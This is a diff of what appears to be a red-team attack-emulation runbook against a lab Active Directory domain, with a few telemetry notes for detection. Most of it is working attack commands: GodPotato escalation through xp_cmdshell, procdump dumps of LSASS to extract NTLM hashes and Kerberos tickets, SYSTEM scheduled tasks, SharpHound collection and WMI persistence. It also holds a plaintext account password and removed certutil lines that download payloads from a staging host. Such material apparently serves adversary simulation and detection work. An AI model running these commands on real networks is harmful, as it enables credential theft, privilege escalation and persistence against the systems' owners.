@@ -176,11 +176,20 @@ SharpHound.exe -c All --zipfilename C:\Windows\Temp\sh.zip
 **Why this is primary:** LSASS PPL is OFF. analyst_cloud has auto-logon → Type 2/11 logon in LSASS. SYSTEM + procdump can dump the process and extract NTLM hash + Kerberos tickets offline.
 
 ```bash
-# Transfer procdump to mbr01
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c certutil -urlcache -split -f http://192.168.77.60:8080/procdump.exe C:\Users\Public\procdump.exe"';
+**Step 1 — Copy procdump from `ws01` beachhead to `mbr01` via SMB (T1570):**
 
+```powershell
+# From ws01 as analyst_t1
+$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
+Copy-Item -Path 'C:\Tools\ADTools\procdump.exe' -Destination '\\mbr01.child.cadre.local\C$\Windows\Temp\cadre-tools\procdump.exe' -Force -Credential $cred
+```
+
+**Step 2 — Dump LSASS as SYSTEM (now that the binary is already on mbr01):**
+
+```bash
 # Dump LSASS (attempt 1: direct)
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\ls.dmp"';
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\cadre-tools\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\cadre-tools\ls.dmp"';
 
 # If direct fails (token issue), use schtasks as SYSTEM
 EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-Procdump /ru SYSTEM /tr \"C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\ls.dmp\" /sc once /st 00:00 /f"';
@@ -373,6 +382,8 @@ EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /t
 EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-SharpHound"';
 ```
 
+**SharpHound binary staging:** Copy `SharpHound.exe` from the `ws01` beachhead (`C:\Tools\ADTools`) to `mbr01` (`C:\Tools\SharpHound.exe`) via SMB (T1570) before creating the task. The scheduled task should execute the already-staged binary, not download it.
+
 **Alternatives:** PsExec, WMI, runas (non-interactive with password pipe).
 
 **Telemetry:** 4698 (task create), 4699 (task run), 4624 with TargetUserName=analyst_cloud, Sysmon 1 parent = svchost.exe/taskeng.exe.
@@ -521,9 +532,20 @@ $binding.Put();
 **Alternative (single-line from xp_cmdshell):**
 
 ```sql
+**Step 1 — Copy the WMI persistence script from `ws01` to `mbr01` via SMB (T1570):**
+
+```powershell
+# From ws01 as analyst_t1
+$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
+Copy-Item -Path 'C:\Tools\ADTools\wmi-persist.ps1' -Destination '\\mbr01.child.cadre.local\C$\Windows\Temp\cadre-tools\wmi-persist.ps1' -Force -Credential $cred
+```
+
+**Step 2 — Execute the staged script as SYSTEM:**
+
+```sql
 -- Write the PowerShell script to disk first, then execute
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c certutil -urlcache -split -f http://192.168.77.60:8080/wmi-persist.ps1 C:\Users\Public\wmi-persist.ps1"';
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c powershell.exe -ep bypass -f C:\Users\Public\wmi-persist.ps1"';
+EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c powershell.exe -ep bypass -f C:\Windows\Temp\cadre-tools\wmi-persist.ps1"';
 ```
 
 **Verify subscription exists:**
